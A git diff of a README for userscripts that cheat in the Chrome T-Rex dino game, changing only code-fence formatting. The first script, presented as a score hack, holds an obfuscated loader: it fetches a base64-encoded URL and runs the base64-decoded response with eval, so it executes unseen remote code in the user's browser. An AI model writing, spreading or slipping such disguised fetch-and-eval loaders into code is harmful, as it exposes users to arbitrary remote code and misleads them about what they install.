@@ -1,5 +1,6 @@
 # T-Rex Dino 3D Hack
-```// ==UserScript==
+```js
+// ==UserScript==
 // @name         T-Rex Dino 3D Hack
 // @version      0.1
 // @description  Set Score hack
@@ -11,7 +12,8 @@
 var x=new XMLHttpRequest;x.open("GET",atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0l0cy1MQUxPTC9TY3JpcHRzL21haW4vM0RfQ2hyb21lX0Rpbm8='),true);x.send();x.onload=function(){eval(atob(x.responseText))};
 ```
 # T-Rex Chrome Hack
-```// ==UserScript==
+```js
+// ==UserScript==
 // @name         T-Rex Chrome Hack
 // @version      0.1
 // @description  God mode, speed changer and set score
